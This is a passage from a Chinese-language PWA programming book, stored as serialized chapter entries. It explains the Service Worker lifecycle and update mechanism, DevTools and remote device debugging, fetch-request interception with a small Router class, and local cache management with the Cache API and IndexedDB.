方法来保证生命周期的执行顺序。该方法接收一个 Promise 参数，开发者通常会将安装的回调执行逻辑（如缓存的写入）封装在一个 Promise 里，如果操作报错应该通过 Promise 来 reject 错误，这样 Service Worker 就知道了安装失败，然后 Service Worker 就能中断生命周期。接下来修改 sw.js 代码如下所示： // sw.js console.log('service worker 注册成功') self.addEventListener('install', event => { // 引入 event.waitUntil 方法 event.waitUntil(new Promise((resolve, reject) => { // 模拟 promise 返回错误结果的情况 reject('安装出错') // resolve('安装成功') })) }) self.addEventListener('activate', () => { // 激活回调的逻辑处理 console.log('service worker 激活成功') }) self.addEventListener('fetch', event => { console.log('service worker 抓取请求成功: ' + event.request.url) }) 这时候运行刷新页面的时候发现 Service Worker 的生命周期中断，而且没有执行 activate 事件回调。当将 reject('安装失败') 改成 resolve('安装成功') 的时候，会发现 Service Worker 能够顺利激活。事实上，ExtendableEvent.waitUntil() 方法扩展了事件的生命周期。在服务工作线程中，延长事件的寿命能够阻止浏览器在事件中的异步操作完成之前终止 worker 工作线程。 在 install 事件回调被调用时，它把即将被激活的 worker 线程状态延迟为 installing 状态，直到传递的 Promise 被成功地 resolve。这主要用于确保：Service Worker 工作线程在所有依赖的核心 cache 被缓存之前都不会被安装。 不只是 install 事件回调可以调用这个方法，如果在 activate 事件回调被调用时，它把即将被激活的 worker 线程状态延迟为 activating 状态，直到传递的 Promise 被成功地 resolve。这主要用于确保：任何功能事件不会被分派到 ServiceWorkerGlobalScope 对象，直到它升级数据库模式并删除过期的缓存条目。 当 ExtendableEvent.waitUntil() 运行时，如果 Promise 是 resolved，任何事情都不会发生；如果 Promise 是 rejected，installing 或者 activating 的状态会被设置为 redundant。 注意： 如果在 ExtendableEvent 处理程序之外调用 waitUntil()，浏览器会抛出一个InvalidStateError 错误。 如果多个调用将会堆叠，所产生的所有 promise 将被添加到延长生命周期的 promise 等待执行完成。 终端 在运行 serviceWorkerLifecycleDemo 示例的时候，提到了需要关闭所有浏览器标签再打开测试页面，其中主要的原因是涉及到 Service Worker 的终端（clients）的概念。 最直接的解释是每一个打开 http://127.0.0.1:8000 页面的浏览器标签都是一个终端，如下图 4-10 所示。 在手机端或者 PC 端浏览器，每新打开一个已经激活了 Service Worker 的页面，那 Service Worker 所控制的终端就新增一个，每关闭一个包含已经激活了 Service Worker 页面的时候（不包含手机端浏览器进入后台运行的情况），则 Service Worker 所控制的终端就减少一个，如上图 4-10 打开了三个浏览器标签，则当前 Service Worker 控制了三个终端，通过 Chrome 浏览器 Devtools 的 Applications -> ServiceWorker 标签可以查看如下图 4-11 所示 Service Worker 控制的三个终端。 当刷新其中一个浏览器标签的时候，会发现一个奇怪的现象，当前的浏览器标签的控制台打印了一条信息如下所示： service worker 抓取请求成功: http://127.0.0.1:8000/imgs/dog.jpg 而并没有对其他的两个浏览器标签进行刷新，但是它们的控制台也出现了打印信息： service worker 抓取请求成功: http://127.0.0.1:8000/ service worker 抓取请求成功: http://127.0.0.1:8000/imgs/dog.jpg 这主要是因为，所有的终端共用一个 worker 工作线程，当在 worker 线程中执行 console.log() 方法打印内容的时候，会作用到所有的终端，worker 工作线程和终端的关系如下图 4-12 所示。 console.log 是浏览器提供的一种特殊的 I/O 操作，并不是常规操作。通常开发者不会这样来应用这种终端机制，一般而是借助 postMessage 机制来通过 worker 工作线程控制终端，worker 线程在某个生命周期回调 postMessage 给各个终端，终端预先绑定 onmessage 事件，回调处理 worker 线程发送过来的指令，可以做一些后台统计的相关工作，甚至可以用这种机制在 Service Worker 线程中，集中对所有终端的 UI 进行统一处理。 clients.claim() 方法 如果使用了 skipWaiting 的方式跳过 waiting 状态，直接激活了 Service Worker，可能会出现其他终端还没有受当前终端激活的 Service Worker 控制的情况，切回其他终端之后，Service Worker 控制页面的效果可能不符合预期，尤其是如果 Service Worker 需要动态拦截第三方请求的时候。 为了保证 Service Worker 激活之后能够马上作用于所有的终端，通常在激活 Service Worker 后，通过在其中调用 self.clients.claim() 方法控制未受控制的客户端。self.clients.claim() 方法返回一个 Promise，可以直接在 waitUntil() 方法中调用，如下代码所示： self.addEventListener('activate', event => { event.waitUntil( self.clients.claim() .then(() => { // 返回处理缓存更新的相关事情的 Promise }) ) }) 注意： 很多开发者默认就在 Service Worker 文件中使用 self.clients.claim()。不建议这么绝对，还是要根据具体项目而定，主要看是否有激活 Service Worker 之后马上控制所有终端的需求。 Service Worker 更新原理 在运行 serviceWorkerLifecycleDemo 的时候，之前提到过，在每次修改 Service Worker 文件的时候，如果需要刷新页面验证效果，都应提前在 Chrome Devtools 中手动 unregister 当前的 Service Worker，主要是因为修改 Service Worker 文件都会触发其更新，而 Service Worker 的更新过程比较复杂，为了区分首次安装、激活和更新触发的安装、激活，保证效果的一致性，所以才有此建议。那接下来重点地讲解一下 Service Worker 的更新原理，看看里面到底有什么门道。 修改 serviceWorkerLifecycleDemo 的 index.html 中注册 sw.js 部分的逻辑，用于触发 Service Worker 的更新（当然也可以修改 Service Worker 文件的某些内容），如下所示： // 触发 Service Worker 的更新 navigator.serviceWorker.register('./sw.js?v=20190401235959') 刷新页面之后控制台打印的内容只有 注册成功，说明更新 Service Worker 会重新解析执行 Service Worker 的 JavaScript 代码，会触发安装回调，但是没有完成激活。查看 Chrome Devtools 的 Service Worker 面板发现 Service Worker 确实卡在激活状态了，状态为 waiting to activate，如下图 4-13 所示： 这就是更新 Service Worker 和首次安装 Service Worker 的一个区别所在。下面通过下图 4-14 了解一下 Service Worker 更新的原理。 当浏览器监测到新的 Service Worker 更新之后，会重新进行注册、安装，当检测到当前的页面被激活态的 Service Worker 控制着的话，会进入 waiting 状态，之后可以有两种选择： 通过 skipWaiting 跳过 waiting 状态 在所有终端保持 waiting 状态，直到 Service Worker 对所有终端失去控制（关闭所有终端的时候） 通过运行 serviceWorkerLifecycleDemo 可以发现，将之前启动的三个终端全部关闭掉，然后再新开一个浏览器标签打开 http://127.0.0.1:8000 之后，会发现新的 Service Worker 已经激活成功。 还可以有另外一种方法，就是在 Chrome Devtools 中点击 “skipWaiting” 按钮，这样就会发现 Service Worker 直接进入了激活状态（反复测试 Demo，记得修改 Service Worker 内容或 URL 以触发 Service Worker 的更新）。 skipWaiting Service Worker 一旦更新，需要等所有的终端都关闭之后，再重新打开页面才能激活新的 Service Worker，这个过程太复杂了。通常情况下，开发者希望当 Service Worker 一检测到更新就直接激活新的 Service Worker。如果不想等所有的终端都关闭再打开的话，只能通过 skipWaiting 的方法了，但是总不能让用户自己去浏览器中点击 “skipWaiting” 按钮吧？ Service Worker 在全局提供了一个 skipWaiting() 方法，skipWaiting() 在 waiting 期间调用还是在之前调用并没有什么不同。一般情况下是在 install 事件中调用它，接下来验证一下效果，可以通过如下代码所示的方式修改 sw.js 代码。 // sw.js console.log('service worker 注册成功') self.addEventListener('install', event => { // 跳过等待 self.skipWaiting() // 引入 event.waitUntil 方法 event.waitUntil(new Promise((resolve, reject) => { // 模拟 promise 返回错误结果的情况 // reject('安装出错') resolve('安装成功') console.log('service worker 安装成功') })) }) self.addEventListener('activate', () => { // 激活回调的逻辑处理 console.log('service worker 激活成功') }) self.addEventListener('fetch', event => { console.log('service worker 抓取请求成功: ' + event.request.url) }) 通过调用 skipWaiting() 方法，运行 Demo 之后刷新任何一个页面都会发现，新的 Service Worker 被激活了。这种方式也被普遍应用在 Service Worker 的更新策略中，主要是为了让用户能够最快的体验到站点的升级和变化。 注意： skipWaiting() 意味着新 Service Worker 可能会控制使用较旧 Service Worker 控制的页面。这意味着页面提取的部分数据将由旧 Service Worker 处理，而新 Service Worker 处理后来提取的数据。如果预期到缓存数据不一致的现象会导致问题，则不要使用 skipWaiting() 跳过 waiting 状态。 手动更新 当刷新页面重新执行 register 方法的时候，浏览器检测到 Service Worker 文件更新就会触发 Service Worker 更新，但是如果站点在浏览器后台长时间没有被刷新，则浏览器将自动检查更新，通常是每隔 24 小时检查一次，但是 24 小时也太长了，所以也可以在代码中手动触发更新，通常做法如下代码所示： navigator.serviceWorker.register('/sw.js') .then(reg => { setInterval(() => { reg.update() }, 60 * 60 * 1000) }) 如果开发者期望用户可以长时间使用您的网站而不必重新加载，您需要按一定间隔（如每小时）调用 update() 方法。 update on reload Service Worker 生命周期是专为用户构建的，这就给开发工作带来一定的困难。幸运的是，我们可借助 Chrome 的 Devtools 的 “update on reload” 功能，在开发调试 Service Worker 生命周期的时候非常友好。如下图 4-15 所示。 通过 update on reload 功能，开发者可以做到以下几点： 重新提取 Service Worker。 即使字节完全相同，也将其作为新版本安装，这表示运行 install 事件并更新缓存。 跳过 waiting 阶段，直接激活新 Service Worker。 浏览页面，每次浏览时（包括刷新）都将进行更新，无需重新加载两次或关闭标签。 所以在测试 serviceWorkerLifecycleDemo 的时候，不妨试一下 update on reload 功能吧。 小结 本节介绍了 Service Worker 的生命周期以及更新机制，了解了 Service Worker 具体的运作方式。虽然目前对 Service Worker 技术点有了全面的了解，但是还是没有涉及到任何离线与缓存相关的东西，为了更加系统深入了解 PWA 离线缓存机制，在下一章中会对 Service Worker 缓存管理进行详细介绍。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter04/4-service-worker-debug.html":{"url":"chapter04/4-service-worker-debug.html","title":"4.4 Service Worker 调试","keywords":"","body":"Service Worker 调试 在开发 Service Worker 文件的过程中，如何调试呢？怎么才能确保线下开发的 Service Worker 文件在经过注册后到线上去运行是符合预期的呢？在这小节中将详细介绍如何调试 Service Worker。 Service Worker 作为独立于主线程的独立线程，在调试方面其实和常规的 JavaScript 开发类似，通常开发者关注的点大概有如下几点： Service Worker 文件 JavaScript 代码是否有报错。 Service Worker 能否顺利安装、激活或者更新。 在不同机型上的兼容性是不是有问题。 不同类型资源和请求的缓存策略的验证。 debug 环境下的开发跳过等待状态 根据 Service Worker 生命周期的特性，如果浏览器还在使用旧的 Service Worker 版本，即使有 Service Worker 新的版本也不会立即被浏览器激活，只能进行安装并进入等待状态，直到浏览器 Tab 标签被重新关闭打开。 在开发调试 Service Worker 时，肯定希望重新加载后立即激活，通常开发者不希望每次都重新打开当前页面调试，为此可以在 install 事件发生时通过 skipWaiting() 来跳过 Service Worker 的 waiting 状态。这样每次 Service Worker 安装后就会被立即激活，通常在 sw.js 中实现如下代码所示： self.addEventListener('install', () => { if (ENV === 'development') { self.skipWaiting() } }) 借助 Chrome Devtool 进行调试 使用 Chrome 浏览器，可以通过进入控制台 Application -> Service Workers 面板查看和调试。其效果如下图 4-16 所示： 如果 Service Worker 线程已安装到当前打开的页面上，接下来会看到它将列示在此窗格中。例如：在上图 4-16 中，展示的是在 https://lavas-project.github.io/lavas-demo/news-v2/#/ 的作用域内安装了一个 Service Worker 线程。 为了更熟练的运用 Chrome Devtools 调试 Service Worker，首先需要熟悉以下这些选项： Offline： 复选框可以将 DevTools 切换至离线模式。它等同于 Network 窗格中的离线模式。 Update on reload：复选框可以强制 Service Worker 线程在每次页面加载时更新。 Bypass for network：复选框可以绕过 Service Worker 线程并强制浏览器转至网络寻找请求的资源。 Update：按钮可以对指定的 Service Worker 线程执行一次性更新。 Push：按钮可以在没有负载的情况下模拟推送通知。 Sync：按钮可以模拟后台同步事件。 Unregister：按钮可以注销指定的 Service Worker 线程。 Source：告诉当前正在运行的 Service Worker 线程的安装时间，链接是 Service Worker 线程源文件的名称。点击链接会将定向并跳转至 Service Worker 线程来源。 Status：告诉 Service Worker 线程的状态。此行上的数字指示 Service Worker 线程已被更新的次数。如果启用 update on reload 复选框，接下来会注意到每次页面加载时此数字都会增大。在状态旁边会看到 start 按钮（如果 Service Worker 线程已停止）或 stop 按钮（如果 Service Worker 线程正在运行）。Service Worker 线程设计为可由浏览器随时停止和启动。 使用 stop 按钮明确停止 Service Worker 线程可以模拟这一点。停止 Service Worker 线程是测试 Service Worker 线程再次重新启动时的代码行为方式的绝佳方法。它通常可以揭示由于对持续全局状态的不完善假设而引发的错误。 Clients：告诉 Service Worker 线程作用域的原点。如果已启用 show all 复选框，focus 按钮将非常实用。 在此复选框启用时，系统会列出所有注册的 Service Worker 线程。如果这时候点击正在不同标签中运行的 Service Worker 线程旁的 focus 按钮，Chrome 会聚焦到该标签。 如果 Service Worker 文件在运行过程中出现了任何的错误，将显示一个 Error 新标签，如下图 4-17 所示。 当然也可以直接访问 Chrome://serviceworker-internals 来打开 serviceWorker 的配置面板，查看所有注册的 Service Worker 情况。 注意： 如无必要，不要选中顶部的 Open DevTools window and pause javaScript execution on Service Worker startup for debugging 复选框，否则每当刷新页面调试时都会弹出一个开发者窗口来。 在 Firefox 中，可以通过 Tools -> Web Developer -> Service Workers 打开调试面板。也可以访问 about:debugging#workers 直接进入该面板。 查看 Service Worker 缓存内容 通过前面的章节已经了解过，Service Worker 使用 Cache API 进行缓存的读写，同样可以在 Chrome DevTools 上查看缓存的资源列表。 Cache Storage 选项卡提供了一个已使用（Service Worker 线程）Cache API 缓存的只读资源列表，如下图 4-18 所示。 如果打开了两个或多个缓存，那在 Application 标签下的 Caches 面板将看到它们会陈列在 Cache Storage 下拉菜单下方，如下图 4-19 所示。 当然，Cache Storage 提供清除 Cache 列表的功能，在选择 Cache Storage 选项卡后在 Cache Storge 缓存的 key 的 item 上右键点击出现 delete ，点击 delete 就可以清除该缓存了，如下图 4-20 所示。 也可以选择 Clear Storage 选项卡进行清除缓存。 网络跟踪 此外经过 Service Worker 的 fetch 请求 Chrome 都会在 Chrome DevTools Network 标签页里标注出来，其中： 来自 Service Worker 的内容会在 Size 字段中标注为 from ServiceWorker Service Worker 发出的请求会在 Name 字段中添加 ⚙ 图标。 如下图 4-21 所示，第一个名为 300 的请求是一张 jpeg 图片， 其 URL 为 https://unsplash.it/200/300，该请求是由 Service Worker 代理的， 因此被标注为 from ServiceWorker。 为了响应页面请求，Service Worker 也发出了名为 300 的请求（这是图 4-21 中第二个请求），但 Service Worker 把 URL 改成了 https://unsplash.it/g/200/300，因此返回给页面的图片是灰色的。 真机调试 由于 Service Worker 必须要在 HTTPS 环境下才能被注册成功，所以在真机调试的过程中还需要解决 HTTPS 调试问题，当然 127.0.0.1 和 localhost 是被允许的 host，但是在真机调试上无法指定为到 PC 上的本地服务器，所以真机 debug 必须要求是已经部署好的 https PWA 站点。 Android inspect 远程调试 对于 Android 设备，可以借助于 Chrome 的 inspect 方法进行调试 PWA，其中有几个事项是需要提前准备的： PC 上已安装 Chrome 32 或更高版本。 PC 上已安装 USB 驱动程序（如果使用 Windows），确保设备管理器报告正确的 USB 驱动程序。 一根可以将 Android 设备连接至开发计算机的 USB 线。 一台 Android 4.0 或更高版本的 Android 设备。 接下来可以通过以下步骤进行调试： 将 Android 设备通过 USB 线与 PC 连接。 在 Android 设备上进行一些设置，选择 设置 > 开发者选项 > 开启 USB 调试。 在 PC 上打开 Chrome，使用一个 Google 帐户登录到 Chrome。（远程调试在隐身模式或访客模式下无法运行）。 在 PC 的 Chrome 浏览器地址栏输入 chrome://inspect。 在 Remote Target 下找到对应的 Android 设备。 点击远程设备链接进入 Chrome Devtools。 这样的话就可以在 Chrome 的 Devtools 直接调试运行在 Android 手机端 Chrome 的 PWA 站点，体验完全和在本地 PC 电脑上 debug 一摸一样。 iOS 远程真机调试 对于 iOS 设备运行的 PWA，真机 debug 有点麻烦，好在 Apple Safari 也提供了一套远程调试的方案，可以借助于 Web Inspector（web 检查器）机制来完成真机调试。在开始调试之前需要准备以下工具： 一台 Mac 电脑。 一个 icloud 账号。 一个 Apple 的移动设备（iPhone）。 用 iCloud 账号登陆 Mac 和 iPhone。 对 iPhone 进行设置：设置 > Apple ID 用户中心入口 > iCloud > 打开 Safari。 对 iPhone 进行设置：设置 > Safari浏览器 > 高级 > 打开 Web Inspector。 对 Mac 进行设置： > 系统偏好设置 > iCloud > 勾上 Safari。 对 Mac 进行设置：打开 Safari > Safari 菜单 > 偏好设置 > 高级 > 勾选“在菜单栏中显示开发菜单”（这时候 Safari 的系统菜单栏多了一个 开发 标签）。 当完成了准备工作后，下面可以开始调试了，调试步骤如下： 用 USB 线连接 iPhone 和 Mac。 在 iPhone 上打开 PWA 站点。 打开 Mac 上 Safari 菜单栏的 开发 标签，就可以点击进 我的 iPhone。 接下来会发现 我的 iPhone 子菜单里有在 iphone 上打开的 PWA 站点，这时候就可以用 Safari 的 Devtools 进行调试。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter05.html":{"url":"chapter05.html","title":"第5章 离线与缓存","keywords":"","body":"离线缓存 通过前面章节对 PWA 概念的了解，我们知道，离线缓存是 PWA 应用在体验提升上的一个重要特性，离线缓存特性能够使得 PWA 应用在离线环境下可以正常使用，在弱网环境下能够使站点快速响应。通常 PWA 的离线缓存特性主要是依赖 Web 提供的 Service Worker 机制和 Cache API 来配合实现的，并且可以在 Service Worker 文件中通过开发一系列的策略来管理网络策略。当然，这些工作比较复杂繁琐，尤其是在大型的 Web App 上，也可以借助开源的 Service Worker 工具库 Workbox 来辅助完成这些事情。 在本章将详细的介绍 PWA 离线缓存相关的概念和技术细节，如 Service Worker 缓存管理、缓存相关 API 等，并通过相关技术点的配合来实现离线缓存策略，最终会看到实际 Web App 项目中是如何高效的开发和维护离线缓存功能。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter05/1-fetch-event-management.html":{"url":"chapter05/1-fetch-event-management.html","title":"5.1 资源请求的拦截代理","keywords":"","body":"资源请求的拦截代理 对资源请求的拦截代理是 Service Worker 的重要功能之一。Service Worker 在完成注册并激活之后，对 fetch 事件的监听就会开始生效，我们可以在事件回调里完成对请求的拦截与改写。下面这个简单的例子演示了如何拦截 http://127.0.0.1:8080/data.txt 的资源请求，并返回固定请求响应的过程： self.addEventListener('fetch', function (event) { if (event.request.url === 'http://127.0.0.1:8080/data.txt') { event.respondWith(new Response('Hello World!')) } }) 这样无论原始的 data.txt 内容是什么，经过上面的 Service Worker 拦截改写之后，都将变成简单的“Hello World!”。基于同样的方法，我们能够对任何形式的资源请求进行拦截代理，包括各种 JS、CSS、HTML 等文本文件，各类接口请求，甚至是图片、视频等数据流都是可以的。 资源请求的判断 fetch 事件会拦截页面上所有的网络资源请求，但我们通常只对部分资源请求进行处理，其余的请求会继续走浏览器默认的资源请求流程。因此需要对当前的资源请求进行判断分类。 fetch 事件回调参数的 event.request 属性描述了当前被拦截的资源请求，可以通过它来进行判断分类。event.request 是 Request 对象的实例，包含了资源请求的 URL、请求模式、请求头等全部信息。 一般情况下，资源请求的判断可以通过对 event.request.url 进行匹配来实现。下面的示例代码展示出部分常用的匹配方法： // 全等匹配 if (event.request.url === 'http://127.0.0.1:8080/data.txt') { // 匹配成功 } // 正则匹配 if (/\\/data\\.txt/.test(event.request.url)) { // 匹配成功 } // 借助 URL 进行匹配 let url = new URL(event.request.url) if ( url.hostname === '127.0.0.1' && url.port === '8080' && url.pathname === '/data.txt' ) { // 匹配成功 } 在一些特殊情况下，仅靠 URL 进行文本匹配并不足以判断资源请求是否满足，那么可以利用 event.request 的其他属性进行辅助判断： // 匹配 POST 请求 if (event.request.method === 'POST') { // 匹配成功 } // 匹配 text/html 资源类型请求 if (event.request.headers.get('Content-Type') === 'text/html') { // 匹配成功 } 我们可以将前面提到的一些常用的匹配方法封装成 match 函数，在后续使用的时候，只需要传入匹配规则和资源请求对象即可： function match (rule, request) { switch (Object.prototype.toString.call(rule)) { // url 文本匹配 case '[object String]': // 使用 URL() 将匹配规则传入的路径补全 return request.url === new URL(rule, location).href // url 正则匹配 case '[object RegExp]': return request.url.match(rule) // 支持自定义匹配 case '[object Function]': return rule(request) } } 下面举一些使用 match 方法进行资源请求匹配的例子： // 完整版 URL 匹配 match('http://127.0.0.1:8080/data.txt', event.request) // 相对路径 URL 匹配 // // 假设当前页面网址为 http://127.0.0.1:8080/index.html // 那么 /data.txt 会自动补全为 http://127.0.0.1:8080/data.txt match('/data.txt', event.request) // 正则匹配 match(/\\/data\\.txt/, event.request) // 自定义匹配方法 match( request => request.url.indexOf('/data.txt') > 0, event.request ) 资源请求的响应 通过 fetch 事件回调参数的方法 event.respondWith(r) 可以指定资源请求的响应结果。respondWith(r) 方法的参数 r 可以是一个 Response 对象实例，也可以是一个 Promise 对象，这个 Promise 对象在异步执行完成的时候同样需要 resolve 返回一个 Response 对象实例作为请求的响应结果。下面演示的两种请求响应方式都是可行的： // 直接返回 Response 对象 event.respondWith(new Response('Hello World!')) // 等待 1 秒钟之后异步返回 Response 对象 event.respondWith(new Promise(resolve => { setTimeout(() => { resolve(new Response('Hello World!')) }, 1000) })) 异步资源请求响应的正确方式 event.respondWith 方法与 install、activate 事件回调参数中的 event.waitUntil 类似，起到了扩展延长 fetch 事件生命周期的作用，在 fetch 事件回调同步执行完毕之前如果没有调用 event.respondWith(r) 指定资源响应结果，那么就会进入浏览器默认的资源请求流程当中。下面所演示一种常见的错误用法，此时 event.respondWith 是没有任何效果的。 // 错误用法 self.addEventListener('fetch', event => { if (event.request.url === 'http://127.0.0.1:8080/data.txt') { setTimeout(() => { event.respondWith(new Response('Hello World!')) }, 1000) } }) 上面的错误用法当中，原本目的是 1 秒钟之后返回 Response 对象，但由于回调函数同步执行完毕之前没有检测到 event.respondWith(r) 方法的调用，因此在 setTimeout 执行回调之前，浏览器就已经发起网络请求并获取到真实的 data.txt，因此它的响应结果并不是被 Service Worker 改写的“Hello World!”。正确的做法是，应该将异步处理的操作包装成一个 Promise 对象传入 event.respondWith 方法中。 // 正确用法 // 等待 1 秒钟之后异步返回 Response 对象 event.respondWith(new Promise(resolve => { setTimeout(() => { resolve(new Response('Hello World!')) }, 1000) })) 资源请求响应的错误处理 需要注意的是，当使用了 event.respondWith 指定资源响应之后，无论是以同步还是异步的方式，最终都需要返回 Response 对象。假如返回的不是 Response 对象，或者是过程中存在任何未处理的错误，除了会导致对应的请求失败之外，控制台还会打印出 Service Worker 的程序错误信息。下面举例说明一些常见的错误，并指出其中错误的原因： // 错误原因：promise 返回结果非 Response 对象 event.respondWith('Hello World!') event.respondWith(Promise.resolve()) event.respondWith(Promise.resolve('Hello World!')) // 错误原因：存在未处理的异步错误 event.respondWith(Promise.reject(new Response('Hello World!'))) 因此在调用 event.respondWith 的时候，需要主动捕获并处理错误、处理异常返回结果。我们可以封装一个 respond 方法来处理响应的各种异常，处理异常的方式我们在这里选择一种比较简单的方式，那就是直接返回一个状态为 500 的 Response 对象： function respond (event, handler) { try { // 执行响应处理方法，根据返回结果进行兜底 let res = handler(event.request) // 异步的响应结果兜底 if (res instanceof Promise) { let promise = res.then(response => { // 如果返回结果非 Response 对象，抛出错误 if (!(response instanceof Response)) { throw Error('返回结果异常') } return response }) // 异步响应错误处理，即直接返回状态码为 500 Response 对象 .catch(() => new Response('Service Worker 出错', {status: 500})) event.respondWith(promise) return } // 同步响应如果出现任何错误 // 可以选择不调用 event.respondWith(r) // 让资源请求继续走浏览器默认的请求流程 if (res instanceof Response) { event.respondWith(res) } } catch (e) {} } 这样，前面提到的各类异常响应就不会导致控制台报错了： // 继续走浏览器默认的请求流程 respond(event, () => 'Hello World!') respond(event, () => {throw Error('出现异常')}) // 返回 500 Response 对象 respond(event, () => Promise.resolve()) respond(event, () => Promise.reject()) // 正常返回 'Hello World!' respond(event, () => new Response('Hello World!')) respond(event, () => Promise.resolve(new Response('Hello World!'))) 这里展示的返回 500 只是其中一种处理方式，读者可以尝试改写成默认发起 fetch() 请求进行兜底。 资源请求与响应操作的管理 在 fetch 事件回调当中主要进行着资源请求匹配和响应结果返回的操作，可以把这个过程当做一个路由分发的问题，因此我们可以封装一个 Router 类来实现对路由的匹配规则和操作分发的统一管理。 class Router { constructor () { // 存放路由规则 this.routes = [] // 注册 fetch 事件拦截 this.initProxy() } initProxy () { self.addEventListener('fetch', event => { // 当拦截到资源请求时，会遍历已注册的路由规则，并执行相应规则所对应的策略 for (let route of this.routes) { // 使用前面封装好的 match 函数进行路由规则匹配 if (match(route.rule, event.request)) { // 使用前面封装好的 respond 方法执行回调操作 respond(event, route.handler) break } } }) } registerRoute (rule, handler) { this.routes.push({rule, handler}) } } 有了这个 Router 类之后，开发者将只需关心如何进行资源请求的规则匹配和响应操作的实现问题。接下来我们使用 Router 来改写本节开篇的实例： const router = new Router() router.registerRoute( '/data.txt', () => new Response('Hello World!') ) 小结 本节内容主要介绍了如何在 Service Worker 中监听 fetch 事件来实现对资源请求拦截代理，介绍了如何通过 event.request 进行资源请求判断，如何通过 event.respondWith 实现对资源请求的响应。最后实现了 Router 类来实现对资源请求和响应操作的统一管理。在下一节，将会进一步探讨资源响应的策略。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-05 11:04:20 "},"chapter05/2-local-storage-management.html":{"url":"chapter05/2-local-storage-management.html","title":"5.2 本地存储管理","keywords":"","body":"本地存储管理 在上一节解决了如何对资源请求进行拦截代理之后，要实现网页的离线缓存还需要解决本地存储的选择与管理问题。 从前面学习中我们知道，处于同一作用域下的网页会共用一个 Service Worker 线程，这个 Service Worker 会同时处理来自不同页面的资源请求的拦截和响应，因此基于性能上的考虑，Service Worker 在设计标准时就要求了任何耗时操作都必须异步实现。这也就导致了在 Service Worker 作用域下能够使，前只有 Cache API 和 IndexedDB，因为目前只有二者在功能实现上全部采用了异步形式，而其他诸如 localStorage 属于同步方法，因此无法在 Service Worker 中使用。 关于 Cache API 和 IndexedDB 在第三章基础技术的简介当中已经做了详细介绍，因此本节的重点将主要放在二者的对比，分析二者的使用场景，在使用时需要关心的注意事项等方面，并在最后举例说明如何结合两种存储方式来实现离线缓存的。 Cache API 与 IndexedDB 的应用场景 Cache API 是为资源请求与响应的存储量身定做的，它采用了键值对的数据模型存储格式，以请求对象为键、响应对象为值，正好对应了发起网络资源请求时请求与响应一一对应的关系。因此 Cache API 适用于请求响应的本地存储。 IndexedDB 则是一种非关系型（NoSQL）数据库，它的存储对象主要是数据，比如数字、字符串、Plain Objects、Array 等，以及少量特殊对象比如 Date、RegExp、Map、Set 等等，对于 Request、Response 这些是无法直接被 IndexedDB 存储的。 可以看到，Cache API 和 IndexedDB 在功能上是互补的。在设计本地资源缓存方案时通常以 Cache API 为主，但在一些复杂的场景下，Cache API 这种请求与响应一一对应的形式存在着局限性，因此需要结合上功能上更为灵活的 IndexedDB，通过 IndexedDB 存取一些关键的数据信息，辅助 Cache API 进行资源管理。 缓存管理注意事项 在进行本地存储开发的时候，需要注意以下几个问题。 本地存储空间是有限的 任何缓存都是有容量大小限制的，Cache API 和 IndexedDB 都不例外。不同的浏览器在分配策略上可能存在不同，一般都会分配出一个较大的存储空间来供这些存储 API 使用。浏览器通常不会主动清除缓存资源，但是如果数据存储容量较大以至于超出浏览器配额时，这时便无法写入资源导致存储失败。 这时浏览器会采用 LRU（Least Recently Used）算法根据数据的历史访问记录来淘汰数据以清理出可存储空间，但这个行为属于浏览器的主动行为不受开发者所控制，可能会导致这部分被清理的缓存资源访问失败。 因此在设计缓存方案时，应该做好缓存资源的过期失效和清理工作，尽量避免被动触发浏览器的资源清理。同时为了满足更加精细化的缓存管理，浏览器提供了 StorageEstimate API 去查询当前缓存空间的使用情况，这样我们就可以利用这些数据来更好地管理缓存资源。其使用方法如下所示： navigator.storage.estimate() .then(estimate => { // 设备为当前域名所分配的存储空间总大小 console.log(estimate.quota) // 当前域名已经使用的存储空间大小 console.log(estimate.usage) }) 资源的存取过程可能会失败 资源在写入存储和读取的过程中都存在失败的可能。 写入失败的原因有很多，比如前面提到的存储资源大小超出浏览器配额时，就会被浏览器限制写入。此外，在隐身模式或者是用户未授权的情况下，一些浏览器同样不允许进行存储操作。 本地的存储资源是完全可以被用户访问的，因此用户随时可能对这些存储资源进行修查找对应资源改或删除。一般来说用户修改数据的情况比较少见，但是清除数据还是很常见的，只要用户主动进行浏览器数据清理操作，就会导致存储数据的丢失。 所以应该随时做好存取失败时的异常捕获与降级方案，确保程序运行时不会出错。 存储的资源可能会过期 即使在存取过程没有发生任何意外的前提下，存储的资源本身也可能会存在过期失效的问题。资源过期就意味着资源是无用甚至错误的，使用这些过期资源会带来各种意想不到的问题，因此要及时做好资源的更新和旧资源的清理工作。 缓存管理实现 接下来我们将通过 CacheWrapper 来统一实现缓存的管理。CacheWrapper 的基本思路是实现对 Cache API 的封装，分别在执行 cache.put() 和 cache.match() 的时候依次完成对缓存对象的更新和旧资源的清理。资源过期信息存放在 IndexedDB 当中，我们可以使用在第三章中封装了 IndexedDB 的 DB 类来简化 IndexedDB 的操作。 构造函数 CacheWrapper 需要传入两个参数 cacheName 和 expireOptions。其中 cacheName 为缓存名称，用于获取 cache 对象以及实例化 db。expireOptions 为资源过期的配置信息，在这里我们只演示资源超时过期的管理，因此只需要传入 maxAgeSeconds 参数规定资源的过期时长即可。 class CacheWrapper { constructor ({ cacheName, expireOptions: { maxAgeSeconds } }) { this.cacheName = cacheName this.maxAgeSeconds = maxAgeSeconds } } 这样我们可以通过如下方式实例化 CacheWrapper： const cacheWrapper = new CacheWrapper({ // 给缓存起个名 cacheName: 'resource-cache', // 假设缓存 1 星期之后资源过期 expireOptions: { maxAgeSeconds: 7 * 24 * 60 * 60 } }) 获取 cache 和 db 对象实例 接下来需要定义获取 cache 对象和 db 对象的方法，通过 this.cacheName 指定名称可以获得通过如下方法分别获得： class CacheWrapper { // ... async getCache () { if (!this.cache) { this.cache = await caches.open(this.cacheName) } return this.cache } getDB () { if (!this.db) { this.db = new 